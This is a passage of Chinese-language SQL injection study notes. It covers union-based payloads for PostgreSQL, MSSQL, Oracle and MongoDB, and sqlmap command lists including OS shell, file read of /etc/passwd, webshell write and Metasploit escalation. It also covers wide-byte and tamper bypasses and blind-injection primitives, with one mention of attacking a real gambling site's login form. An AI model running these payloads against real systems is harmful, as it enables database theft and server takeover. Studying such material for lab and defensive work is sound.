+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">-测列数：<br>order by 4<br>and 1=2 union select null,null,null,null<br>-测显位：第2，3<br>and 1=2 union select <span class="hljs-string">&#x27;null&#x27;</span>,null,null,null 错误<br>and 1=2 union select null,<span class="hljs-string">&#x27;null&#x27;</span>,null,null 正常<br>and 1=2 union select null,null,<span class="hljs-string">&#x27;null&#x27;</span>,null 正常<br>and 1=2 union select null,null,null,<span class="hljs-string">&#x27;null&#x27;</span> 错误<br>-获取信息：<br>and 1=2 UNION SELECT null,version(),null,null<br>and 1=2 UNION SELECT null,current_user,null,null<br>and 1=2 union select null,current_database(),null,null<br>-获取数据库名：<br>and1=2 union select null,string_agg(datname,<span class="hljs-string">&#x27;,&#x27;</span>),null,null from pg_database<br>-获取表名：<br>1、and1=2 union select null,string_agg(tablename,<span class="hljs-string">&#x27;,&#x27;</span>),null,null from pg_tables <span class="hljs-built_in">where</span> schemaname=<span class="hljs-string">&#x27;public&#x27;</span><br>2、and1=2 union select null,string_agg(relname,<span class="hljs-string">&#x27;,&#x27;</span>),null,null from pg_stat_user_tables<br>-获取列名：<br>and1=2 union select null,string_agg(column_name,<span class="hljs-string">&#x27;,&#x27;</span>),null,null from information_schema.columns <span class="hljs-built_in">where</span> table_name=<span class="hljs-string">&#x27;reg_users&#x27;</span><br>-获取数据：<br>and1=2 union select null,string_agg(name,<span class="hljs-string">&#x27;,&#x27;</span>),string_agg(password,<span class="hljs-string">&#x27;,&#x27;</span>),null from reg_users<br>-补充-获取dba用户（同样在DBA用户下，是可以进行文件读写的）：<br>and1=2 union select null,string_agg(usename,<span class="hljs-string">&#x27;,&#x27;</span>),null,nullFROM pg_user WHERE usesuper ISTRUE<br>参考：<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>MSSQL-sa高权限读写执行注入<blockquote>
+<ol>
+<li>测试列数方式为null填充</li>
+</ol>
+</blockquote>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">-测列数：<br>order by 4<br>and1=2 union all select null,null,null,null<br>-测显位：<br>and1=2 union all select null,1,null,null<br>and1=2 union all select null,null,<span class="hljs-string">&#x27;s&#x27;</span>,null<br>-获取信息：<br>@@version 获取版本信息<br>db_name() 当前数据库名字<br>user、system_user,current_user,user_name 获取当前用户名<br>@@SERVERNAME 获取服务器主机信息<br>and1=2 union all select null,db_name(),null,null<br>-获取表名：<br>and1=2 union all select null,(select top 1 name from mozhe_db_v2.dbo.sysobjects <span class="hljs-built_in">where</span> xtype=<span class="hljs-string">&#x27;u&#x27;</span>),null,null<br>union all select null,(select top 1 name from mozhe_db_v2.dbo.sysobjects <span class="hljs-built_in">where</span> xtype=<span class="hljs-string">&#x27;u&#x27;</span>and name not <span class="hljs-keyword">in</span>(<span class="hljs-string">&#x27;manage&#x27;</span>)),null,null<br>-获取列名：<br>and1=2 union all select null,(select top 1col_name(object_id(<span class="hljs-string">&#x27;manage&#x27;</span>),1) from sysobjects),null,null<br>and1=2 union all select null,(select top 1col_name(object_id(<span class="hljs-string">&#x27;manage&#x27;</span>),2) from sysobjects),null,null<br>and1=2 union all select null,(select top 1col_name(object_id(<span class="hljs-string">&#x27;manage&#x27;</span>),3) from sysobjects),null,null<br>and1=2 union all select null,(select top 1col_name(object_id(<span class="hljs-string">&#x27;manage&#x27;</span>),4) from sysobjects),null,null<br>-获取数据：<br>and1=2 union all select null,username, password ,null from manage<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>结尾彩蛋-某Q牌违法登陆框注入<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">实战注入思路:<br>1. 寻找注入点.<br>2. 分析网站架构, 什么语言搭建, 数据库是什么类型.<br>3. 根据数据库类型获取相关数据, 是否为高权限用户.<br>4. 是否能获取到服务器权限.<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="3-Sqlmap-amp-Oracle-amp-Mongodb-amp-DB2"><a href="#3-Sqlmap-amp-Oracle-amp-Mongodb-amp-DB2" class="headerlink" title="3. Sqlmap&amp;Oracle&amp;Mongodb&amp;DB2"></a>3. Sqlmap&amp;Oracle&amp;Mongodb&amp;DB2</h2><hr>
+<h3 id="3-1-知识点："><a href="#3-1-知识点：" class="headerlink" title="3.1 知识点："></a>3.1 知识点：</h3><p>1、数据库注入-Oracle&amp;Mongodb<br>2、数据库注入-DB2&amp;SQLite&amp;Sybase<br>3、SQL注入神器-SQLMAP安装使用拓展</p>
+<h3 id="3-2-SQLMAP"><a href="#3-2-SQLMAP" class="headerlink" title="3.2 SQLMAP"></a>3.2 SQLMAP</h3><ul>
+<li><strong>什么是SQLMAP？</strong></li>
+</ul>
+<p>能检测网站是否存在注入并利用注入点</p>
+<ul>
+<li><strong>它支持那些数据库注入？</strong></li>
+</ul>
+<p>市面上%99的都支持, nosql不支持</p>
+<ul>
+<li><strong>它支持那些SQL注入模式？</strong></li>
+</ul>
+<p>布尔盲注, 时间盲注, 错误注入, union查询, 堆叠注入, 带外DNSlog</p>
+<ul>
+<li><strong>它支持那些其他不一样功能？</strong></li>
+</ul>
+<p>支持代理注入, tamper脚本</p>
+<ul>
+<li><strong>使用SQLMAP一般注入流程分析？</strong></li>
+</ul>
+<p>1.判断出注入点 2.什么数据库的注入点 3. 是低权限还是高权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">常用语句 :<br>1./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db --<span class="hljs-built_in">users</span> --passwords --dbs -v 0 <br>2./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --passwords -U root --union-use -v 2 <br>3./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -T <span class="hljs-built_in">users</span> -C username -D userdb --start 2 --stop 3 -v 2 <br>4./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -C <span class="hljs-string">&quot;user,pass&quot;</span> -v 1 --exclude-sysdbs <br>5./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --sql-shell -v 2 <br>6./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-read <span class="hljs-string">&quot;c:\boot.ini&quot;</span> -v 2 <br>7./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-write /test/test.txt --file-dest /var/www/html/1.txt -v 2 <br>8./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-cmd <span class="hljs-string">&quot;id&quot;</span> -v 1 <br>9./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-shell --union-use -v 2 <br>10./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 --priv-esc -v 1 <br>11./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 -v 1 <br>12./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-bof --msf-path=/opt/framework/msf3 -v 1 <br>13./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --reg-add --reg-key=<span class="hljs-string">&quot;HKEY_LOCAL_NACHINE\SOFEWARE\sqlmap&quot;</span> --reg-value=Test --reg-type=REG_SZ --reg-data=1 <br>14./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --eta <br>15./sqlmap.py -u <span class="hljs-string">&quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot;</span> -p <span class="hljs-built_in">id</span> --prefix <span class="hljs-string">&quot;&#x27;)&quot;</span> --suffix <span class="hljs-string">&quot;AND (&#x27;abc&#x27;=&#x27;abc&quot;</span><br>16./sqlmap.py -u <span class="hljs-string">&quot;http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1&quot;</span> --auth-type Basic --auth-cred <span class="hljs-string">&quot;testuser:testpass&quot;</span><br>17./sqlmap.py -l burp.log --scope=<span class="hljs-string">&quot;(www)?\.target\.(com|net|org)&quot;</span><br>18./sqlmap.py -u <span class="hljs-string">&quot;http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot;</span> --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3 <br>19./sqlmap.py -u <span class="hljs-string">&quot;http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot;</span> --sql-query <span class="hljs-string">&quot;SELECT &#x27;foo&#x27;&quot;</span> -v 1 <br>20./sqlmap.py -u <span class="hljs-string">&quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot;</span> --common-tables -D testdb --banner <br>21./sqlmap.py -u <span class="hljs-string">&quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot;</span> --cookie=<span class="hljs-string">&quot;PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low&quot;</span> --string=<span class="hljs-string">&#x27;xx&#x27;</span> --dbs --level=3 -p <span class="hljs-string">&quot;uid&quot;</span><br></code></pre></td></tr></table></figure>
+<p><strong>参考</strong>：<br>清除缓存 –purge</p>
+<h3 id="3-3-演示案例："><a href="#3-3-演示案例：" class="headerlink" title="3.3 演示案例："></a>3.3 演示案例：</h3><ul>
+<li>数据库注入-联合猜解-Oracle&amp;Mongodb</li>
+<li>数据库注入-SQLMAP-DB2&amp;SQLite&amp;Sybase<ul>
+<li>直接SQLMAP跑, 会自己识别</li>
+<li>python3 sqlmap.py -u <a target="_blank" rel="noopener" href="http://127.0.0.1/?id=1">http://127.0.0.1?id=1</a></li>
+</ul>
+</li>
+<li>数据库注入-SQLMAP-数据猜解&amp;高权限读写执行</li>
+</ul>
+<p><strong>#Oracle</strong><br>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/peterpan0707007/p/8242119.html">https://www.cnblogs.com/peterpan0707007/p/8242119.html</a><br>测回显：and 1&#x3D;2 union select ‘1’,’2’ from dual<br>爆库：and 1&#x3D;2 union select ‘1’,(select table_name from user_tables where rownum&#x3D;1) from dual<br>模糊爆库：and 1&#x3D;2 union select ‘1’,(select table_name from user_tables where rownum&#x3D;1 and table_name like ‘%user%’) from dual<br>爆列名：and 1&#x3D;2 union select ‘1’,(select column_name from all_tab_columns where rownum&#x3D;1 and table_name&#x3D;’sns_users’) from dual<br>爆其他列名：and 1&#x3D;2 union select ‘1’,(select column_name from all_tab_columns where rownum&#x3D;1 and table_name&#x3D;’sns_users’ and column_name not in (‘USER_NAME’)) from dual<br>爆数据：and 1&#x3D;2 union select user_name,user_pwd from “sns_users”<br>爆其他数据：and 1&#x3D;2 union select user_name,user_pwd from “sns_users” where USER_NAME&lt;&gt;’hu’</p>
+<p><strong>#Mongodb 看代码</strong><br>参考：<a target="_blank" rel="noopener" href="https://www.runoob.com/mongodb/mongodb-query.html">https://www.runoob.com/mongodb/mongodb-query.html</a><br>测回显：&#x2F;new_list.php?id&#x3D;1’}); return ({title:1,content:’2<br>爆库： &#x2F;new_list.php?id&#x3D;1’}); return ({title:tojson(db),content:’1<br>爆表： &#x2F;new_list.php?id&#x3D;1’}); return ({title:tojson(db.getCollectionNames()),content:’1<br>爆字段：&#x2F;new_list.php?id&#x3D;1’}); return ({title:tojson(db.Authority_confidential.find()[0]),content:’1<br>db.getCollectionNames()返回的是数组，需要用tojson转换为字符串。<br>db.Authority_confidential是当前用的集合（表），find函数用于查询，0是第一条数据</p>
+<p><strong>#简单的注入流程 :</strong><br>1.读取数据库版本，当前用户，当前数据库<br>sqlmap -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -f -b –current-user –current-db -v 1<br>2.判断当前数据库用户权限<br>sqlmap -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –privileges -U 用户名 -v 1<br>sqlmap -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –is-dba -U 用户名 -v 1<br>3.读取所有数据库用户或指定数据库用户的密码<br>sqlmap -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –users –passwords -v 2<br>sqlmap -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –passwords -U root -v 2<br>4.获取所有数据库<br>sqlmap -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –dbs -v 2<br>5.获取指定数据库中的所有表<br>sqlmap -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –tables -D mysql -v 2<br>6.获取指定数据库名中指定表的字段<br>sqlmap -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –columns -D mysql -T users -v 2<br>7.获取指定数据库名中指定表中指定字段的数据<br>sqlmap -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –dump -D mysql -T users -C “username,password” -s “sqlnmapdb.log” -v 2<br>8.file-read读取web文件<br>sqlmap -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –file-read “&#x2F;etc&#x2F;passwd” -v 2<br>9.file-write写入文件到web<br>sqlmap -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –file-write &#x2F;localhost&#x2F;mm.php –file使用sqlmap绕过防火墙进行注入测试</p>
+<h2 id="4-Tamper脚本-amp-Base64-amp-Json-amp-md5等"><a href="#4-Tamper脚本-amp-Base64-amp-Json-amp-md5等" class="headerlink" title="4. Tamper脚本&amp;Base64&amp;Json&amp;md5等"></a>4. Tamper脚本&amp;Base64&amp;Json&amp;md5等</h2><h3 id="4-1-知识点："><a href="#4-1-知识点：" class="headerlink" title="4.1 知识点："></a>4.1 知识点：</h3><p>1、数据表现格式类型注入<br>2、字符转义绕过-宽字节注入<br>:::info<br>原理:<br>程序会对参数中存在的 ‘, “, null进行转义, 转义符”&quot;url编码为 %5c, 参数中加入%df’ , 进入程序会变成<br>%df&#39; –&gt;%df%5c’ –&gt; 運’<br>因为MySQL默认编码为GBK, GBK编码是两个字节存储, utf-8是一个字节<br>:::<br>3、数字&amp;字符&amp;搜索&amp;编码&amp;加密等</p>
+<p>#参考资料：<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/9326258.html">https://www.cnblogs.com/bmjoker/p/9326258.html</a><br>扫描，利用工具等都不会自动判断数据类型，格式等，所以即使有漏洞也测不出来，具体还是需要人工的去观察，进行工具的修改或加载插件再次探针才可以。</p>
+<h3 id="4-2-演示案例："><a href="#4-2-演示案例：" class="headerlink" title="4.2 演示案例："></a>4.2 演示案例：</h3><ul>
+<li><p>本地源码-数字&amp;字符&amp;搜索&amp;编码&amp;JSON</p>
+<ul>
+<li>数字型: 0-9</li>
+<li>字符型: a-z, 中文, 标点, 注入需要考虑闭合问题<ul>
+<li><a target="_blank" rel="noopener" href="http://127.0.0.1/blog1/news.php?gtpl=simple">http://127.0.0.1/blog1/news.php?gtpl=simp</a>le**’ order by 12 –+**</li>
+</ul>
+</li>
+<li>搜索型: 字符型基础上加入通配符<ul>
+<li><a target="_blank" rel="noopener" href="http://127.0.0.1/blog1/news.php?search=%E6%BC%94%E7%A4%BA">http://127.0.0.1/blog1/news.php?search=</a>演示%’ order by 12 –+</li>
+<li><a target="_blank" rel="noopener" href="http://127.0.0.1/blog1/news.php?search=%E6%BC%94%E7%A4%BA">http://127.0.0.1/blog1/news.php?search=</a><strong>演示%’ order by 12  and ‘%’&#x3D;’</strong></li>
+<li>SQL语句: select * from sy_guestbook where gName like ‘%<strong>演示%’ order by 12  and ‘%’&#x3D;’</strong>%’</li>
+</ul>
+</li>
+<li>编码型: 数据以编码值传递<ul>
+<li><a target="_blank" rel="noopener" href="http://127.0.0.1/blog1/news.php?base=MQ==">http://127.0.0.1/blog1/news.php?base=</a></li>
+</ul>
+</li>
+<li>加密型: 数据以加密密文传送<ul>
+<li><a target="_blank" rel="noopener" href="http://127.0.0.1/blog1/news.php?base=MQ==">http://127.0.0.1/blog1/news.php?base=<strong>MQ&#x3D;&#x3D;</strong></a></li>
+<li>我们传入的数据都应是加密后的, 程序解密后拼接到SQL语句中</li>
+</ul>
+</li>
+<li>格式型: JSON<ul>
+<li>json&#x3D;{“username”: “张三”}</li>
+<li>在程序获取的时候, get(“username”) –&gt; 张三</li>
+<li>payload: json&#x3D;{“username”: “<strong>张三’ order by 12–+</strong>“}</li>
+<li>考虑的是, 获取到值, 值再拼接到SQL中, SQL中的闭合方式</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><h2 id="墨者靶场-字符转义处理防护-宽字节注入-http-127-0-0-1-blog1-news-php-gtpl-simple‘-order-by-12–-select-from-sy-guestbook-where-gTpl-x3D-’simple-39-order-by-12–-‘-会自动转义单引号-php中-addslashes-函数会对字符-单引号’、双引号”、反斜线-与-NULL-进行转义"><a href="#墨者靶场-字符转义处理防护-宽字节注入-http-127-0-0-1-blog1-news-php-gtpl-simple‘-order-by-12–-select-from-sy-guestbook-where-gTpl-x3D-’simple-39-order-by-12–-‘-会自动转义单引号-php中-addslashes-函数会对字符-单引号’、双引号”、反斜线-与-NULL-进行转义" class="headerlink" title="墨者靶场-字符转义处理防护-宽字节注入 - http://127.0.0.1/blog1/news.php?gtpl=simple‘ order by 12–+ - select * from sy_guestbook where gTpl&#x3D;’simple&#39; order by 12–+‘  # 会自动转义单引号 - php中 addslashes()函数会对字符 单引号’、双引号”、反斜线\与 NULL, 进行转义"></a>墨者靶场-字符转义处理防护-宽字节注入<br> - <a target="_blank" rel="noopener" href="http://127.0.0.1/blog1/news.php?gtpl=simple">http://127.0.0.1/blog1/news.php?gtpl=simple</a><strong>‘ order by 12–+</strong><br> - select * from sy_guestbook where gTpl&#x3D;’simple<strong>&#39; order by 12–+</strong>‘  # 会自动转义单引号<br> - php中 addslashes()函数会对字符 单引号’、双引号”、反斜线\与 NULL, 进行转义</h2></li>
+<li><p>真实WEB-数据编码接受处理-base64注入</p>
+</li>
+<li><p>真实WEB-JSON数据格式&amp;MD5加密数据</p>
+</li>
+<li><p>工具脚本-SQLMAP-脚本Tamper使用指南</p>
+<ul>
+<li>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://127.0.0.1/blog1/news.php?gtpl=simple">http://127.0.0.1/blog1/news.php?gtpl=simple</a>“ –tamper&#x3D;base64encode.py</li>
+<li>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://127.0.0.1/blog1/news.php?kuan=simple%22">http://127.0.0.1/blog1/news.php?kuan=simple"</a> –tamper&#x3D;unmagicquotes</li>
+</ul>
+</li>
+</ul>
+<h2 id="5-HTTP头XFF-amp-COOKIE-amp-POST请求"><a href="#5-HTTP头XFF-amp-COOKIE-amp-POST请求" class="headerlink" title="5. HTTP头XFF&amp;COOKIE&amp;POST请求"></a>5. HTTP头XFF&amp;COOKIE&amp;POST请求</h2><h3 id="5-1-知识点："><a href="#5-1-知识点：" class="headerlink" title="5.1 知识点："></a>5.1 知识点：</h3><p>1、数据请求方式-GET&amp;POST&amp;COOKIE等<br>2、常见功能点请求方式-用户登录&amp;IP记录等<br>3、黑盒白盒注入测试要点-SQLMAP注入参数</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/12889352/1662904260041-3c830eca-8a9c-4fd8-8204-bed4250af70a.png#averageHue=%23f9f8f8&clientId=uf402b5e3-f838-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=382&id=u20d1d16a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=478&originWidth=914&originalType=binary&ratio=1&rotation=0&showTitle=false&size=256411&status=done&style=none&taskId=ud7ceb4a1-d110-4472-8e60-d86701ebfb8&title=&width=731.2" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>#补充点：<br>黑盒测试：功能点分析<br>白盒测试：功能点分析&amp;关键代码追踪</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/12889352/1662905491413-1da472de-4c38-4a20-978a-41eb7cbcc7b3.png#averageHue=%23eeedeb&clientId=uf402b5e3-f838-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=125&id=ud88a4cbf&margin=%5Bobject%20Object%5D&name=image.png&originHeight=156&originWidth=460&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7214&status=done&style=none&taskId=ucabbe095-5926-4ef6-b906-b696c4a0859&title=&width=368" srcset="/img/loading.gif" lazyload alt="image.png"><br>他为什么会知道我还可以尝试四次登录</p>
+<ol>
+<li>记录了我的IP</li>
+<li>记录我账号</li>
+<li>记录我cookie</li>
+</ol>
+<h3 id="5-2-演示案例："><a href="#5-2-演示案例：" class="headerlink" title="5.2 演示案例："></a>5.2 演示案例：</h3><hr>
+<ul>
+<li>GET&amp;POST&amp;COOKIE&amp;SERVER</li>
+<li>实例黑盒-后台表单登陆框-POST注入<ul>
+<li>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://127.0.0.1/login.php">http://127.0.0.1/login.php</a>“ –data “name&#x3D;zhangsan&amp;passwd&#x3D;zhangsan”</li>
+</ul>
+</li>
+<li>实例白盒-ESPCMS-商品购买-COOKIE注入<ul>
+<li>第28讲最后40分钟, 没听懂</li>
+</ul>
+</li>
+<li>实例白盒-ZZCMS-IP记录功能-HTTP头XFF注入<ul>
+<li>X_Forward_For: 1.1.1.1</li>
+</ul>
+</li>
+</ul>
+<p>#部分语言接受代码块</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type: text/html; charset=utf-8&quot;</span>);<br><br><br><span class="hljs-variable">$get</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;g&#x27;</span>];<br><span class="hljs-variable">$post</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;p&#x27;</span>];<br><span class="hljs-variable">$cookie</span>=<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-variable">$request</span>=<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;r&#x27;</span>];<br><span class="hljs-variable">$host</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_HOST&#x27;</span>]; <span class="hljs-comment">//当前访问url地址</span><br><span class="hljs-variable">$user_agent</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;HTTP_USER_AGENT&quot;</span>]; <span class="hljs-comment">//浏览器信息</span><br><span class="hljs-variable">$ip</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>]; <span class="hljs-comment">// 8.8.8.8</span><br><br><br><span class="hljs-keyword">echo</span><span class="hljs-variable">$get</span>.<span class="hljs-string">&quot;&lt;hr&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span><span class="hljs-variable">$post</span>.<span class="hljs-string">&quot;&lt;hr&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span><span class="hljs-variable">$cookie</span>.<span class="hljs-string">&quot;&lt;hr&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span><span class="hljs-variable">$request</span>.<span class="hljs-string">&quot;&lt;hr&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span><span class="hljs-variable">$host</span>.<span class="hljs-string">&quot;&lt;hr&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span><span class="hljs-variable">$user_agent</span>.<span class="hljs-string">&quot;&lt;hr&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span><span class="hljs-variable">$ip</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+<p>Java Spring  不同框架，不同写法<br>method&#x3D;RequestMethod.GET<br>method&#x3D;RequestMethod.POST<br>request.getParameter(“参数名”);<br>可以直接获取get请求的参数key对应的value<br>也可以从请求体中获取参数的key对应的value</p>
+<p>Python flask 不同框架，不同写法<br>requests.get<br>requests.post<br>request.args.get(key)<br>request.form.get(key)<br>request.values.get(key)</p>
+<h2 id="6-amp-增删改查-amp-盲注-amp-延时-amp-布尔-amp-报错"><a href="#6-amp-增删改查-amp-盲注-amp-延时-amp-布尔-amp-报错" class="headerlink" title="6. &amp;增删改查&amp;盲注&amp;延时&amp;布尔&amp;报错"></a>6. &amp;增删改查&amp;盲注&amp;延时&amp;布尔&amp;报错</h2><hr>
+<h3 id="6-1-知识点："><a href="#6-1-知识点：" class="headerlink" title="6.1 知识点："></a>6.1 知识点：</h3><p>1、明确查询方式注入Payload<br>2、明确查询方式注入产生功能<br>3、明确SQL盲注延时&amp;布尔&amp;报错</p>
+<p>#详细点：<br>盲注就是在注入过程中，获取的数据不能回显至前端页面。<br>此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。<br>解决：常规的联合查询注入不行的情况<br>我们可以知道盲注分为以下三类：<br>-基于布尔的SQL盲注-逻辑判断<br>regexp,like,ascii,left,ord,mid<br>-基于时间的SQL盲注-延时判断<br>if,sleep<br>-基于报错的SQL盲注-报错回显<br>floor，updatexml，extractvalue<br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/bc35f8dd4f7c">https://www.jianshu.com/p/bc35f8dd4f7c</a></p>
+<p>参考：<br>like ‘ro%’ #判断ro或ro…是否成立<br>regexp ‘^xiaodi[a-z]’ #匹配xiaodi及xiaodi…等<br>if(条件,5,0) #条件成立 返回5 反之 返回0<br>sleep(5) #SQL语句延时执行5秒<br>mid(a,b,c) #从位置b开始，截取a字符串的c位<br>substr(a,b,c) #从位置b开始，截取字符串a的c长度<br>left(database(),1)，database() #left(a,b)从左侧截取a的前b位<br>length(database())&#x3D;8 #判断数据库database()名的长度<br>ord&#x3D;ascii ascii(x)&#x3D;97 #判断x的ascii码是否等于97</p>
+<p>SQL查询方式注入<br>select,insert,update,delete,orderby等</p>
+<p>基本知识本地测试<br>select * from member where username like ‘vi%’;<br>select * from member where username regexp ‘^x’;<br>select * from member where id&#x3D;1 and sleep(1);<br>select * from member where id&#x3D;1 and if(1&gt;2,sleep(1),0);<br>select * from member where id&#x3D;1 and if(1&lt;2,sleep(1),0);<br>select * from member where id&#x3D;1 and length(database())&#x3D;7;<br>select * from member where id&#x3D;1 and left(database(),1)&#x3D;’p’;<br>select * from member where id&#x3D;1 and left(database(),2)&#x3D;’pi’;<br>select * from member where id&#x3D;1 and substr(database(),1,1)&#x3D;’p’;<br>select * from member where id&#x3D;1 and substr(database(),2,1)&#x3D;’i’;<br>select * from member where id&#x3D;1 and ord(left(database(),1))&#x3D;112;</p>
+<h3 id="6-2-演示案例："><a href="#6-2-演示案例：" class="headerlink" title="6.2 演示案例："></a>6.2 演示案例：</h3><hr>
+<ul>
+<li><p>SQL-盲注&amp;布尔&amp;报错&amp;延时</p>
+</li>
+<li><h2 id="查询-select-xhcms-布尔盲注"><a href="#查询-select-xhcms-布尔盲注" class="headerlink" title="查询-select-xhcms-布尔盲注"></a>查询-select-xhcms-布尔盲注</h2></li>
+<li><p>插入-insert-xhcms-报错盲注</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://127.0.0.1:81/index.php?r=contact">http://127.0.0.1:81/index.php?r=contact</a></li>
